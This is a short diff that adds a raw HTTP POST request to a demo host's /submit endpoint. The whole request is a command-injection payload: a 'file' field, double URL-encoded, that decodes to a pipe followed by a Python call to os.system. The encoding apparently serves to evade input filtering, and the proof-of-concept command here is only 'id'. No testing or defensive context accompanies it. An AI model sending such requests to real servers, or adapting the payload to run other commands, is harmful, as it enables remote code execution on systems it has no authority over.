@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+Connection: close
+
+file=%257C%2Bpython%2B-c%2B%2522import%2Bos%253B%2Bos.system%2528%2527id%2527%2529%2522
